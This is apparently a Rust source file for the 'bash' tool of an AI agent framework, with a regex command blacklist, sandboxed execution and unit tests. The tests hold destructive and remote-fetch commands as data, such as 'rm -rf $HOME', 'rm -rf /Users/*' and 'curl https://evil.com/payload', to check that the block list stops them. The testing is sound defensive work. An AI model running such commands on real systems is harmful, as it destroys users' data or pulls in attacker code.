use async_trait::async_trait;
use regex::Regex;
use serde_json::json;
use std::sync::LazyLock;
use std::time::Duration;

use halcon_core::error::{HalconError, Result};
use halcon_core::traits::Tool;
use halcon_core::types::{PermissionLevel, SandboxConfig, ToolInput, ToolOutput};

use crate::sandbox;

/// Built-in blacklist of dangerous command patterns (runtime layer).
///
/// NOTE — DUAL BLACKLIST ARCHITECTURE (see `halcon-core/src/security.rs`):
/// There are two independent blacklist systems in this codebase:
///   1. This one (halcon-tools/bash.rs): applied at execute() time, returns
///      `HalconError::InvalidInput` — occurs AFTER permission was granted.
///   2. `command_blacklist.rs` (halcon-cli): applied at the G7 HARD VETO gate
///      in `ConversationalPermissionHandler::authorize()` — occurs BEFORE execution.
///
/// Patterns are sourced from `halcon_core::security::CATASTROPHIC_PATTERNS` —
/// the single source of truth, shared between this runtime guard and the G7 VETO.
/// `2>/dev/null` stderr suppression is NOT blocked — the anchor `^` prevents it.
static DEFAULT_BLACKLIST: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    halcon_core::security::CATASTROPHIC_PATTERNS
        .iter()
        .map(|pattern| {
            Regex::new(pattern)
                .unwrap_or_else(|e| panic!("Invalid built-in blacklist pattern {}: {}", pattern, e))
        })
        .collect()
});

/// Apply sandbox rlimits to a command (Unix only, no-op elsewhere).
#[cfg(unix)]
fn apply_sandbox_limits(cmd: &mut tokio::process::Command, config: SandboxConfig) {
    // SAFETY: apply_rlimits only calls setrlimit which is async-signal-safe.
    unsafe {
        cmd.pre_exec(move || sandbox::apply_rlimits(&config));
    }
}

#[cfg(not(unix))]
fn apply_sandbox_limits(_cmd: &mut tokio::process::Command, _config: SandboxConfig) {}

/// Execute a bash command.
#[derive(Debug)]
pub struct BashTool {
    default_timeout_ms: u64,
    sandbox_config: SandboxConfig,
    /// Custom user-defined blacklist patterns (regex).
    custom_blacklist: Vec<Regex>,
    /// Whether built-in safety blacklist is disabled.
    builtin_disabled: bool,
}

impl BashTool {
    /// Create a new BashTool with command blacklist support.
    ///
    /// # Arguments
    /// - `timeout_secs`: Default timeout for command execution
    /// - `sandbox_config`: Sandbox limits (memory, CPU, etc.)
    /// - `custom_patterns`: Additional regex patterns to block (beyond built-in)
    /// - `disable_builtin`: If true, disables built-in safety blacklist
    ///
    /// # Errors
    /// Returns error if any custom pattern fails to compile.
    pub fn new(
        timeout_secs: u64,
        sandbox_config: SandboxConfig,
        custom_patterns: Vec<String>,
        disable_builtin: bool,
    ) -> Result<Self> {
        // Compile custom patterns
        let mut custom_blacklist = Vec::new();
        for (i, p) in custom_patterns.iter().enumerate() {
            let regex = Regex::new(p).map_err(|e| {
                HalconError::InvalidInput(format!(
                    "Invalid blacklist pattern at index {}: {} ({})",
                    i, p, e
                ))
            })?;
            custom_blacklist.push(regex);
        }

        Ok(Self {
            default_timeout_ms: timeout_secs * 1000,
            sandbox_config,
            custom_blacklist,
            builtin_disabled: disable_builtin,
        })
    }

    /// Check if a command matches any blacklist pattern.
    ///
    /// Returns Some(reason) if blocked, None if allowed.
    fn is_command_blacklisted(&self, cmd: &str) -> Option<String> {
        // Check built-in patterns first (unless disabled)
        if !self.builtin_disabled {
            for pattern in DEFAULT_BLACKLIST.iter() {
                if pattern.is_match(cmd) {
                    return Some(format!(
                        "Command matches built-in safety pattern: {}",
                        pattern.as_str()
                    ));
                }
            }
        }

        // Check custom patterns
        for pattern in &self.custom_blacklist {
            if pattern.is_match(cmd) {
                return Some(format!(
                    "Command matches custom blacklist: {}",
                    pattern.as_str()
                ));
            }
        }

        None
    }

    /// Execute a command inside the OS-level sandbox (macOS Seatbelt / Linux unshare).
    ///
    /// This is the primary execution boundary. The sandbox restricts:
    /// - File writes to working directory + /tmp only
    /// - Network access (denied by default)
    /// - Sensitive environment variables (scrubbed on Linux)
    async fn execute_sandboxed(
        &self,
        command: &str,
        input: &ToolInput,
        timeout: Duration,
    ) -> Result<ToolOutput> {
        use halcon_sandbox::{SandboxConfig as OsSandboxConfig, SandboxPolicy, SandboxedExecutor};

        // Default policy: allow network and shell chaining (required for normal dev workflows).
        // OS-level sandbox restricts filesystem writes and scrubs sensitive env vars.
        let policy = SandboxPolicy {
            allow_network: true,
            allow_shell_chaining: true,
            ..SandboxPolicy::default()
        };

        let os_config = OsSandboxConfig {
            policy,
            working_dir: std::path::PathBuf::from(&input.working_directory),
            timeout,
            max_output_bytes: self.sandbox_config.max_output_bytes,
            shell: "/bin/bash".to_string(),
            use_os_sandbox: true,
            writable_paths: vec![],
            readable_paths: vec![],
        };

        let executor = SandboxedExecutor::new(os_config);
        let result = executor.execute(command).await;

        if let Some(ref violation) = result.policy_violation {
            tracing::warn!(command = %command, violation = %violation, "OS sandbox policy blocked command");
        }

        let content = if result.output.is_empty() {
            "(no output)".to_string()
        } else {
            result.output
        };

        Ok(ToolOutput {
            tool_use_id: input.tool_use_id.clone(),
            content,
            is_error: result.is_error,
            metadata: Some(json!({
                "exit_code": result.exit_code,
                "sandboxed": true,
                "timed_out": result.timed_out,
            })),
        })
    }
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        "Execute a bash command and return its output. Commands run in a non-interactive shell."
    }

    fn permission_level(&self) -> PermissionLevel {
        PermissionLevel::Destructive
    }

    /// Structural hard-veto: check catastrophic patterns BEFORE execution.
    ///
    /// This fires on every `tool.execute()` call regardless of code path —
    /// even if the caller bypasses the permission pipeline. This is the
    /// innermost defense layer (defense-in-depth).
    fn pre_execute_check(&self, input: &ToolInput) -> std::result::Result<(), String> {
        if let Some(command) = input.arguments.get("command").and_then(|v| v.as_str()) {
            if let Some(reason) = self.is_command_blacklisted(command) {
                tracing::warn!(
                    command = %command,
                    reason = %reason,
                    "HARD VETO: Blocked dangerous bash command at trait level"
                );
                return Err(reason);
            }
        }
        Ok(())
    }

    async fn execute_inner(&self, input: ToolInput) -> Result<ToolOutput> {
        let command = input.arguments["command"]
            .as_str()
            .ok_or_else(|| HalconError::InvalidInput("bash requires 'command' string".into()))?;

        if command.trim().is_empty() {
            return Err(HalconError::InvalidInput(
                "bash: command must not be empty".into(),
            ));
        }

        // NOTE: Blacklist check moved to pre_execute_check() — runs structurally
        // via the provided execute() method on every invocation. No duplicate needed.

        let timeout_ms = input.arguments["timeout_ms"]
            .as_u64()
            .unwrap_or(self.default_timeout_ms);

        let timeout = Duration::from_millis(timeout_ms.min(600_000));

        // ── OS-level sandbox path ──────────────────────────────────────────
        // When use_os_sandbox is enabled, delegate to halcon_sandbox::SandboxedExecutor
        // which provides macOS Seatbelt (sandbox-exec) or Linux unshare isolation.
        // This is the primary execution boundary for bash commands.
        if self.sandbox_config.use_os_sandbox {
            return self.execute_sandboxed(command, &input, timeout).await;
        }

        // ── Fallback: direct execution with rlimits only ───────────────────
        let sandbox_config = self.sandbox_config.clone();
        let result = tokio::time::timeout(timeout, async {
            let mut cmd = tokio::process::Command::new("bash");
            cmd.arg("-c")
                .arg(command)
                .current_dir(&input.working_directory);

            // Apply rlimits on Unix via pre_exec.
            apply_sandbox_limits(&mut cmd, sandbox_config);

            cmd.output().await
        })
        .await;

        let max_output = self.sandbox_config.max_output_bytes;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();

                // Truncate large outputs using sandbox utility.
                let stdout = sandbox::truncate_output(&stdout, max_output);
                let stderr = sandbox::truncate_output(&stderr, max_output);

                let exit_code = output.status.code().unwrap_or(-1);
                let mut content = String::new();

                if !stdout.is_empty() {
                    content.push_str(&stdout);
                }
                if !stderr.is_empty() {
                    if !content.is_empty() {
                        content.push('\n');
                    }
                    content.push_str("STDERR:\n");
                    content.push_str(&stderr);
                }
                if content.is_empty() {
                    content = "(no output)".to_string();
                }

                Ok(ToolOutput {
                    tool_use_id: input.tool_use_id,
                    content,
                    is_error: exit_code != 0,
                    metadata: Some(json!({ "exit_code": exit_code })),
                })
            }
            Ok(Err(e)) => Err(HalconError::ToolExecutionFailed {
                tool: "bash".into(),
                message: format!("failed to execute command: {e}"),
            }),
            Err(_) => Err(HalconError::ToolTimeout {
                tool: "bash".into(),
                timeout_secs: timeout_ms / 1000,
            }),
        }
    }

    fn input_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The bash command to execute"
                },
                "timeout_ms": {
                    "type": "integer",
                    "description": "Timeout in milliseconds (default: 120000, max: 600000)"
                }
            },
            "required": ["command"]
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tool() -> BashTool {
        BashTool::new(120, SandboxConfig::default(), vec![], false).unwrap()
    }

    fn tool_no_sandbox() -> BashTool {
        BashTool::new(
            120,
            SandboxConfig {
                enabled: false,
                ..SandboxConfig::default()
            },
            vec![],
            false,
        )
        .unwrap()
    }

    fn make_input(args: serde_json::Value) -> ToolInput {
        ToolInput {
            tool_use_id: "test-id".into(),
            arguments: args,
            working_directory: "/tmp".into(),
        }
    }

    #[tokio::test]
    async fn execute_echo() {
        let input = make_input(json!({ "command": "echo hello" }));
        let output = tool().execute(input).await.unwrap();
        assert!(!output.is_error);
        assert!(output.content.trim().contains("hello"));
    }

    #[tokio::test]
    async fn execute_failing_command() {
        let input = make_input(json!({ "command": "exit 42" }));
        let output = tool().execute(input).await.unwrap();
        assert!(output.is_error);
        let meta = output.metadata.unwrap();
        assert_eq!(meta["exit_code"], 42);
    }

    #[tokio::test]
    async fn captures_stderr() {
        let input = make_input(json!({ "command": "echo err >&2" }));
        let output = tool().execute(input).await.unwrap();
        assert!(output.content.contains("STDERR:"));
        assert!(output.content.contains("err"));
    }

    #[tokio::test]
    async fn timeout_on_slow_command() {
        let input = make_input(json!({ "command": "sleep 60", "timeout_ms": 100 }));
        let result = tool().execute(input).await;
        assert!(result.is_err());
        match result.unwrap_err() {
            HalconError::ToolTimeout { .. } => {}
            other => panic!("expected ToolTimeout, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn respects_working_directory() {
        let dir = tempfile::TempDir::new().unwrap();
        let input = ToolInput {
            tool_use_id: "test".into(),
            arguments: json!({ "command": "pwd" }),
            working_directory: dir.path().to_str().unwrap().into(),
        };
        let output = tool().execute(input).await.unwrap();
        // The output should contain the temp dir path (may be canonicalized).
        assert!(!output.is_error);
    }

    #[tokio::test]
    async fn missing_command_arg() {
        let input = make_input(json!({}));
        let result = tool().execute(input).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn sandbox_disabled_still_works() {
        let input = make_input(json!({ "command": "echo sandbox_off" }));
        let output = tool_no_sandbox().execute(input).await.unwrap();
        assert!(!output.is_error);
        assert!(output.content.contains("sandbox_off"));
    }

    #[tokio::test]
    async fn output_truncation_applies() {
        // Create a tool with very small output limit.
        let small_sandbox = SandboxConfig {
            max_output_bytes: 50,
            enabled: false,
            ..SandboxConfig::default()
        };
        let t = BashTool::new(120, small_sandbox, vec![], false).unwrap();
        let input = make_input(json!({ "command": "seq 1 1000" }));
        let output = t.execute(input).await.unwrap();
        // Output should be truncated.
        assert!(output.content.contains("truncated"));
    }

    // === Phase 30: Fix 5b — reject empty command ===

    #[tokio::test]
    async fn empty_command_rejected() {
        let input = make_input(json!({ "command": "  " }));
        let result = tool().execute(input).await;
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("command must not be empty"), "Error: {err}");
    }

    // === Home-directory rm blacklist patterns ===

    #[test]
    fn blacklist_rm_rf_tilde() {
        let t = tool();
        assert!(t.is_command_blacklisted("rm -rf ~/").is_some());
        assert!(t.is_command_blacklisted("rm -rf ~").is_some());
    }

    #[test]
    fn blacklist_rm_rf_home_env() {
        let t = tool();
        assert!(t.is_command_blacklisted("rm -rf $HOME").is_some());
        assert!(t.is_command_blacklisted("rm -rf $HOME/").is_some());
    }

    #[test]
    fn blacklist_rm_rf_users_glob() {
        let t = tool();
        assert!(t.is_command_blacklisted("rm -rf /Users/*").is_some());
    }

    #[test]
    fn blacklist_does_not_block_safe_rm() {
        // rm -rf on a specific sub-directory should NOT be blocked
        let t = tool();
        assert!(t.is_command_blacklisted("rm -rf /tmp/my_build").is_none());
        assert!(t.is_command_blacklisted("rm -f somefile.txt").is_none());
    }

    #[test]
    fn invalid_custom_pattern_returns_error() {
        let result = BashTool::new(
            120,
            SandboxConfig::default(),
            vec!["[invalid(regex".to_string()],
            false,
        );
        assert!(result.is_err(), "invalid regex pattern should return Err");
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("Invalid blacklist pattern"),
            "error message should mention invalid pattern, got: {err}"
        );
    }

    #[test]
    fn valid_custom_pattern_is_applied() {
        let t = BashTool::new(
            120,
            SandboxConfig::default(),
            vec!["curl.*evil\\.com".to_string()],
            false,
        )
        .expect("valid regex should compile");
        assert!(
            t.is_command_blacklisted("curl https://evil.com/payload")
                .is_some(),
            "custom pattern should block matching command"
        );
        assert!(
            t.is_command_blacklisted("curl https://good.com/data")
                .is_none(),
            "custom pattern should not block non-matching command"
        );
    }

    // === PASO 2: stderr suppression must NOT be blocked ===

    #[test]
    fn stderr_redirect_to_dev_null_allowed() {
        let t = tool();
        // Common pattern: suppress stderr noise — must NOT be blocked
        assert!(
            t.is_command_blacklisted("cargo build 2>/dev/null")
                .is_none(),
            "cargo build 2>/dev/null must be allowed"
        );
        assert!(
            t.is_command_blacklisted("cargo check 2>/dev/null")
                .is_none(),
            "cargo check 2>/dev/null must be allowed"
        );
        assert!(
            t.is_command_blacklisted("make 2>/dev/null").is_none(),
            "make 2>/dev/null must be allowed"
        );
        assert!(
            t.is_command_blacklisted("some_cmd 2>/dev/null 1>/dev/null")
                .is_none(),
            "both stdout+stderr suppressed must be allowed"
        );
    }

    #[test]
    fn bare_dev_null_redirect_blocked() {
        let t = tool();
        // A command whose ENTIRE content is just >/dev/null (no actual command) is blocked
        assert!(
            t.is_command_blacklisted("> /dev/null").is_some(),
            "> /dev/null (bare redirect) must be blocked"
        );
        assert!(
            t.is_command_blacklisted(">/dev/null").is_some(),
            ">/dev/null (bare redirect) must be blocked"
        );
    }

    #[test]
    fn stdout_redirect_with_real_command_allowed() {
        let t = tool();
        // Redirecting stdout to /dev/null is a valid discard pattern
        assert!(
            t.is_command_blacklisted("command_output >/dev/null")
                .is_none(),
            "command >/dev/null (with real command) must be allowed"
        );
    }
}
